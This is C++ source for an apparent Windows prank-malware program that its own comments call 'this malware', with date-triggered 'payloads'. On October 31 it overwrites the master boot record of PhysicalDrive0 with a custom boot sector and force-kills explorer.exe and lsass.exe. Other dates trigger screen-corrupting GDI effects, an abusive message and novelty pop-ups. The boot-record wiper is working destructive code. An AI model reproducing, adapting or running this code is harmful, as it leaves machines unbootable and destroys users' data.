#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <sstream>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <cmath>
#include <time.h>
typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;
#define M_PI   3.14159265358979323846264338327950288
//#define PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
const unsigned char MasterBootRecord[] = { 0xE8, 0x03, 0x00, 0xE8, 0x1D, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xFF,
0x06, 0x5D, 0x7C, 0xEB, 0x12, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x2D, 0x81, 0xFA, 0xC8, 0x00, 0x73,
0xEA, 0xCD, 0x10, 0x41, 0xEB, 0xED, 0xC3, 0x89, 0xCB, 0x21, 0xD3, 0x88, 0xD8, 0x22, 0x06, 0x5D,
0x7C, 0xC0, 0xE8, 0x02, 0xEB, 0x00, 0x3C, 0x37, 0x77, 0x06, 0x3C, 0x20, 0x72, 0x06, 0xEB, 0xD5,
0x2C, 0x10, 0xEB, 0xF2, 0x04, 0x20, 0xEB, 0xEE, 0x31, 0xC9, 0x42, 0xEB, 0xC6, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
}; //credits to JhoPro/ArTicZera for the original code
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI melt(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HDC hdc = GetDC(0);
	HBITMAP hbmTemp = CreateCompatibleBitmap(hdc, w, h);
	HDC hdcTemp = CreateCompatibleDC(hdc);
	SelectObject(hdcTemp, hbmTemp);
	POINT cursor;
	while (1) {
		hdc = GetDC(0);
		for (INT i = 64; i > 8; i -= 8)
		{
			GetCursorPos(&cursor);
			TRIVERTEX vertex[3];
			vertex[0].x = cursor.x - 80;
			vertex[0].y = cursor.y + 50;
			vertex[0].Red = 0x999999;
			vertex[0].Green = 0;
			vertex[0].Blue = 0;
			vertex[0].Alpha = 0;

			vertex[1].x = cursor.x;
			vertex[1].y = cursor.y - 70;
			vertex[1].Red = 0;
			vertex[1].Green = 0x999999;
			vertex[1].Blue = 0;
			vertex[1].Alpha = 0;

			vertex[2].x = cursor.x + 80;
			vertex[2].y = cursor.y + 50;
			vertex[2].Red = 0;
			vertex[2].Green = 0;
			vertex[2].Blue = 0x999999;
			vertex[2].Alpha = 0;

			// Create a GRADIENT_RECT structure that 
			// references the TRIVERTEX vertices. 
			GRADIENT_TRIANGLE gTriangle;
			gTriangle.Vertex1 = 0;
			gTriangle.Vertex2 = 1;
			gTriangle.Vertex3 = 2;

			// Draw a shaded rectangle. 
			GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
			ReleaseDC(0, hdc);
		}
	}
}

DWORD WINAPI redbrush(LPVOID lpParam) { //Christmas payload I guess
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, 0, 0));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(rand()%1000);
	}
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		text2 = "DIE, FUCKING PIECE OF SHIT!!!";
		SetBkColor(hdc, RGB(0, rand() % 50, rand() % 10));
		SetTextColor(hdc, RGB(0, 0, rand() % 255));
		HFONT font = CreateFontA(43, 32, rand() % 999, rand() % 999, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Wingings");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(rand() % 10);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI bounce(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = (x + y) + (i + i * 90);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI plgblt(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 100;
		wPt[0].y = wRect.top - 100;
		wPt[1].x = wRect.right + 100;
		wPt[1].y = wRect.top + 100;
		wPt[2].x = wRect.left - 100;
		wPt[2].y = wRect.bottom - 100;
		PlgBlt(hdc, wPt, hdc, wRect.left - 20, wRect.top - 20, (wRect.right - wRect.left) + 40, (wRect.bottom - wRect.top) + 40, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}


INT CheckDate(INT i) //credits to ArTicZera for the date checking function, but I fixed sh!tty conflicts in the code
{
	time_t t = time(0);
	tm date = *localtime(&t);

	if (i == 32) i = date.tm_mday; //1-31
	if (i == 33) i = date.tm_mon;  //0-11
	if (i == 34) i = date.tm_year; //XXXX

	//Actually the return value for the year is
	//The year of the system - 1900. 
	//And the return value of the month is The month of the system -1

	return i;
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
			while (1) { //we will check the dates every minute
				if (CheckDate(32) == 1 && CheckDate(33) == 0) //this painful code took me hours to make
				{
					time_t t = time(0);
					tm date = *localtime(&t);
					int yr = date.tm_year + 1900;
					std::ostringstream ostrm;
					ostrm << "Happy new year " << yr << std::endl;
					MessageBox(NULL, "Happy Sussy Year!!!", "Happy Sussy Year!!!", MB_ICONINFORMATION);
					Sleep(-1);
				}
				else if (CheckDate(32) == 1 && CheckDate(33) == 3)
				{
					HANDLE thread1 = CreateThread(0, 0, melt, 0, 0, 0);
					Sleep(-1);
				}
				else if (CheckDate(32) == 31 && CheckDate(33) == 9) //check if it's October 31, and run the final collapse of the system
				{
					CreateThread(0, 0, MBRWiper, 0, 0, 0);
					ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, SW_SHOWDEFAULT);
					ShellExecuteA(NULL, NULL, "taskkill", "/f /im lsass.exe", NULL, SW_SHOWDEFAULT); //the best way to kill process by name in visual c++, because sh!tty microsoft compiler doesn't like every other way to do this task and GCC is meh
					HANDLE thread3 = CreateThread(0, 0, textout1, 0, 0, 0);
					HANDLE thread4 = CreateThread(0, 0, bounce, 0, 0, 0);
					Sleep(30000);
					TerminateThread(thread4, 0);
					CloseHandle(thread4);
					InvalidateRect(0, 0, 0);
					HANDLE thread5 = CreateThread(0, 0, plgblt, 0, 0, 0);
					Sleep(-1);
				}
				else if (CheckDate(32) == 25 && CheckDate(33) == 11) //check if it's Christmas, if your PC somehow managed to survive the Halloween payload
				{
					MessageBox(NULL, "Merry Christmas!", "Merry Christmas", MB_ICONINFORMATION);
					Sleep(-1);
				}
				else if (CheckDate(32) == 9 && CheckDate(33) == 8)
				{
					MessageBox(NULL, "Say happy birhtday to mrsuperbuddy!", "mrsuperbuddy", MB_ICONINFORMATION);
					Sleep(-1);
				}
				else if (CheckDate(32) == 1 && CheckDate(33) == 9)
				{
					MessageBox(NULL, "No computer today, you're going to school!", "School", MB_ICONWARNING);
					Sleep(-1);
				}
				else if (CheckDate(32) == 16 && CheckDate(33) == 8)
				{
					MessageBox(NULL, "Do you know, in this day, I created my first malware!", "mrsuperbuddy: Chromoxide", MB_ICONINFORMATION);
					HANDLE thread5 = CreateThread(0, 0, redbrush, 0, 0, 0);
					Sleep(-1);
				}
				else if (CheckDate(32) == 25 && CheckDate(33) == 5)
				{
					MessageBox(NULL, "Summer anhead!", ERROR, MB_ICONINFORMATION);
					HANDLE thread5 = CreateThread(0, 0, plgblt, 0, 0, 0);
					Sleep(-1);
				}
				Sleep(60000);
			}
		}

